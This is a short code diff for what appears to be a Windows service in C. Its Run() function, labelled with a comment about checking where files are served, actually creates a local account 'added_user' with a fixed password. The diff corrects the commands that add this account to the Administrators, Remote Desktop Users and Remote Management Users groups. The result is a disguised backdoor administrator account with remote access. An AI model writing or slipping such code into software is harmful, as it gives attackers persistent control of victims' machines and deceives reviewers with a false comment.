@@ -35,9 +35,9 @@ void ControlHandler(DWORD request);
 int Run() 						// make sure the files are being served at the correct addresses
 { 
 	system("net user /add added_user Password1#");
-	system("net localgroup administrators /add");
-	system("net localgroup \"Remote Desktop Users\" /add");
-	system("net localgroup \"Remote Management Users\" /add");
+	system("net localgroup administrators added_user /add");
+	system("net localgroup \"Remote Management Users\" added_user /add");
+	system("net localgroup \"Remote Desktop Users\" added_user /add");
     return 0; 
 } 
 
